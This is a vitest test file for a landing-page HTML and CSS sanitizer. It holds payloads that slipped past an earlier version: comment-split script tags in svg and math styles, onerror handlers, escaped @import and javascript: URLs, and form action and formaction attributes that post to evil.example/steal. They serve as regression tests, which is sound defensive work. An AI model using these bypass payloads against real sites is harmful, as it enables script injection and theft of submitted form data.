import { describe, expect, it } from 'vitest';
import {
  applyLandingVariables,
  injectPageStyles,
  maskInert,
  sanitizeLandingCss,
  sanitizeLandingHtml,
} from './landing-html-sanitize';

/**
 * WHAT THE SECURITY REVIEW OF THE FIRST VERSION PROVED.
 *
 * Every payload below was run against the sanitizer as it stood and came
 * back live. The sandboxed frame and the CSP contained them; the aim — no
 * script injected, no handler, no form posted out — did not depend on them,
 * so none of these is allowed to rely on the frame either.
 *
 * What is asserted is what a BROWSER would build: the text that is left
 * once a style element's inert text is taken away.
 */

/** The markup of a document — a style element's text is not markup in html, so it goes. */
const markup = (html: string) => html.replace(/<style\b[^>]*>[\s\S]*?(?:<\/style[^>]*>|$)/gi, '');
/** Everything that would be live INSIDE an svg or math, where a style's text IS markup. */
const hasLiveBits = (html: string) => /<\s*(script|img|iframe|object|embed|link|base|meta)\b/i.test(html) || /\son[a-z]+\s*=/i.test(html);

describe('a comment cannot split a word the sanitizer is looking for', () => {
  const attacks: Record<string, string> = {
    'script in an svg style': '<svg><style><scr/**/ipt>alert(1)</scr/**/ipt></style></svg>',
    'script in a math style': '<math><style><scr/**/ipt>alert(1)</scr/**/ipt></style></math>',
    'handler in an svg style': '<svg><style><img src=x o/**/nerror=alert(1)></style></svg>',
    'iframe in an svg style': '<svg><style><ifr/**/ame src="https://evil/"></style></svg>',
    'javascript url in a style': '<style>a{background:url(java/**/script:alert(1))}</style>',
    'doubled comments': '<svg><style><scr/**//**/ipt>alert(1)</scr/**//**/ipt></style></svg>',
    'a comment that closes another': '<svg><style><scr/' + '*/**' + '/*/ipt>alert(1)</style></svg>',
  };

  for (const [name, html] of Object.entries(attacks)) {
    it(`${name}: nothing live is left`, () => {
      const out = sanitizeLandingHtml(html);
      expect(hasLiveBits(out), out).toBe(false);
      expect(out).not.toMatch(/javascript\s*:/i);
    });
  }

  it('and the answer is a fixed point: cleaning it again changes nothing', () => {
    for (const html of Object.values(attacks)) {
      const once = sanitizeLandingHtml(html);
      expect(sanitizeLandingHtml(once)).toBe(once);
    }
  });

  // negative: a sound page, svg and style included, is returned byte for byte
  it('a sound page with an svg, a style block and a media query passes unchanged', () => {
    const page =
      '<!doctype html><html dir="rtl"><head><title>عرض</title>' +
      '<style>body{margin:0}@media (width<600px){.a{color:red}} .b>.c{margin:0}</style></head>' +
      '<body><svg viewBox="0 0 10 10"><path d="M0 0h10v10z"/></svg><a href="https://shop.example/p?a=1&amp;b=2">اطلب</a></body></html>';
    expect(sanitizeLandingHtml(page)).toBe(page);
  });
});

describe('CSS is read the way a CSS parser reads it', () => {
  // what is asserted is that the PAYLOAD is gone (the host or the call), not that a keyword is: an
  // escaped keyword is still a keyword to a CSS parser and would slip past a check on its spelling
  const gone = (css: string) => !/evil|alert/i.test(sanitizeLandingCss(css));

  it('@import split by a comment', () => {
    expect(gone('@/**/import url(https://evil/x.css);.a{color:red}')).toBe(true);
  });

  it('@import written with a CSS escape, short and long form', () => {
    expect(gone('@\\69mport url(//evil/x.css);.a{color:red}')).toBe(true);
    expect(gone('@\\000069mport url(//evil/x.css);.a{color:red}')).toBe(true);
    expect(gone('@\\69 mport url(//evil/x.css);.a{color:red}')).toBe(true);
  });

  it('@import that rejoins when the inside one is removed', () => {
    expect(gone('@imp@import;ort url(https://evil/x.css);')).toBe(true);
  });

  it('@import with no semicolon at the end of the sheet', () => {
    expect(gone('.a{color:red}@import url(https://evil/x.css)')).toBe(true);
  });

  it('javascript: written with an escape inside url()', () => {
    expect(gone('a{background:url(\\6a avascript:alert(1))}')).toBe(true);
    expect(gone('a{background:url(j\\61vascript:alert(1))}')).toBe(true);
  });

  it('expression() split by a comment', () => {
    expect(gone('a{width:expr/**/ession(alert(1))}')).toBe(true);
  });

  it('a style element that is never closed is still held to the rules', () => {
    const out = sanitizeLandingHtml('<style>@import url(https://evil/x.css);.a{color:red}');
    expect(out).not.toMatch(/@import|evil/i);
    expect(out).toContain('.a{color:red}');
  });

  it('and the same through the HTML door with an escape in it', () => {
    const out = sanitizeLandingHtml('<style>@\\69mport url(https://evil/x.css);.a{color:red}</style>');
    expect(out).not.toMatch(/import|evil/i);
  });

  // negative
  it('escapes that are not plain letters are left exactly as written', () => {
    const css = '.i::before{content:"\\f101"}.q::before{content:"\\201C "}.n::after{content:"a\\A b"}';
    expect(sanitizeLandingCss(css)).toBe(css);
  });

  it('a remote image or font is still allowed — the CSP decides, as before', () => {
    const css = '.h{background:url(https://cdn.example/x.jpg)}@font-face{src:url(https://cdn.example/f.woff2)}';
    expect(sanitizeLandingCss(css)).toBe(css);
  });

  it('a lookalike word that is not @import stays', () => {
    const css = '.important{color:red}.a::after{content:"import"}';
    expect(sanitizeLandingCss(css)).toBe(css);
  });
});

describe('a separator that is not a space', () => {
  it('<form/action=…> loses its action', () => {
    expect(sanitizeLandingHtml('<form/action=//evil.example/steal method=post><input name=phone></form>')).not.toMatch(/action/i);
  });

  it('<form id="a"action=…> loses its action and keeps the quote', () => {
    const out = sanitizeLandingHtml('<form id="a"action=//evil.example/steal></form>');
    expect(out).not.toMatch(/action/i);
    expect(out).toContain('id="a"');
  });

  it('<button/formaction=…> loses its formaction', () => {
    const out = sanitizeLandingHtml('<form><button/formaction=//evil.example/steal>x</button></form>');
    expect(out).not.toMatch(/formaction/i);
  });

  it('and one after a quote', () => {
    expect(sanitizeLandingHtml('<form><button type="submit"formaction="//evil.example/">x</button></form>')).not.toMatch(/formaction/i);
  });

  // negative
  it('a form without an action is left as it was', () => {
    const html = '<form method="post" id="f" data-action="x"><input name="phone"><button type="submit">اطلب</button></form>';
    expect(sanitizeLandingHtml(html)).toBe(html);
  });
});

describe('a product name is escaped in every context', () => {
  it('an apostrophe cannot end a single-quoted attribute', () => {
    const out = applyLandingVariables("<div title='{{product.name}}'>x</div>", { name: "x' onmouseover='alert(1)" });
    expect(out).toBe("<div title='x&#39; onmouseover=&#39;alert(1)'>x</div>");
  });

  // negative
  it('an ordinary name is unchanged', () => {
    expect(applyLandingVariables('<h1>{{product.name}}</h1>', { name: 'كريم الشمس' })).toBe('<h1>كريم الشمس</h1>');
  });
});

/**
 * THE SELLER'S CSS IS SPLICED IN WHERE A PARSER WOULD SPLICE IT.
 */
describe('maskInert', () => {
  it('has the same length as its input, so a position in one is a position in the other', () => {
    const html = '<!-- c --><p title="a>b">x</p><title>t</title><script>1</script>é';
    expect(maskInert(html)).toHaveLength(html.length);
  });

  it('blanks comments, quoted values and the text of title, textarea, script and style', () => {
    const m = maskInert("<!-- </head> --><a title='</head>'>x</a><title></head></title><textarea></head></textarea><script></head></script><style></head></style>");
    expect(m).not.toContain('</head>');
  });

  it('leaves real tags alone', () => {
    expect(maskInert('<html><head></head><body>x</body></html>')).toBe('<html><head></head><body>x</body></html>');
  });
});

describe('injectPageStyles', () => {
  const base = '<style id="b">body{}</style>';
  const custom = '<style id="c">a{}</style>';
  const doc = '<!doctype html><html><head><title>t</title></head><body>BODY-MARKER</body></html>';
  const at = (html: string, needle: string) => html.indexOf(needle);

  it('both go before </head>, the settings first and the seller css last', () => {
    const out = injectPageStyles(doc, base, custom);
    expect(at(out, base)).toBeGreaterThan(at(out, '</title>'));
    expect(at(out, base)).toBeLessThan(at(out, custom));
    expect(at(out, custom)).toBeLessThan(at(out, '</head>'));
  });

  it('the settings come AFTER a style that was in the uploaded file, so they win the cascade', () => {
    const own = '<style>body{background:red}</style>';
    const out = injectPageStyles(`<html><head>${own}</head><body></body></html>`, base, custom);
    expect(at(out, base)).toBeGreaterThan(at(out, own));
  });

  it('a $\' in the css does not paste the rest of the document into it', () => {
    const evil = `<style>a::after{content:"$'"}b::after{content:"$&"}</style>`;
    const out = injectPageStyles(doc, '', evil);
    expect(out).toContain(evil + '</head>');
    expect(out.match(/BODY-MARKER/g)).toHaveLength(1);
  });

  describe('the </head> is the one a parser sees', () => {
    const lands = (html: string, css: string) => {
      const out = injectPageStyles(html, '', `<style id="zaki-custom-style">${css}</style>`);
      // the style element is MARKUP in the output: the mask keeps its tag
      // (the mask blanks the quoted id, so the tag is recognised by its shape)
      expect(maskInert(out), out).toMatch(/<style id="_+">/);
      return out;
    };

    it('not the one inside a comment', () => {
      const out = lands(
        '<!doctype html><!-- </head> --><html><head><title>t</title></head><body>B</body></html>',
        '--><img src=x onerror=alert(1)><!--'
      );
      expect(hasLiveBits(markup(out))).toBe(false);
      expect(out).not.toContain('<img');
      expect(out.indexOf('zaki-custom-style')).toBeGreaterThan(out.indexOf('</title>'));
    });

    it('not the one inside a quoted attribute value', () => {
      const out = lands(
        "<html><head><meta data-x='</head>'><title>t</title></head><body>B</body></html>",
        "' onmouseover=alert(1) x='"
      );
      expect(out.indexOf('zaki-custom-style')).toBeGreaterThan(out.indexOf('</title>'));
      expect(markup(out)).not.toMatch(/onmouseover/i);
    });

    it('not the one inside a textarea', () => {
      const out = lands(
        '<html><head><textarea></head></textarea></head><body>B</body></html>',
        '</textarea><img src=x onerror=alert(1)>'
      );
      expect(out.indexOf('zaki-custom-style')).toBeGreaterThan(out.indexOf('</textarea>'));
      expect(out).not.toContain('<img');
    });

    it('not the one inside a title', () => {
      const out = lands(
        '<html><head><title></head></title></head><body>B</body></html>',
        '</title><img src=x onerror=alert(1)>'
      );
      expect(out.indexOf('zaki-custom-style')).toBeGreaterThan(out.lastIndexOf('</title>'));
      expect(out).not.toContain('<img');
    });
  });

  it('<header> is not </head>: with no head at all both go to the front', () => {
    expect(injectPageStyles('<header>H</header><p>x</p>', base, custom)).toBe(base + custom + '<header>H</header><p>x</p>');
  });

  it('with nothing to inject the document is returned as it came', () => {
    expect(injectPageStyles(doc, '', '')).toBe(doc);
  });
});
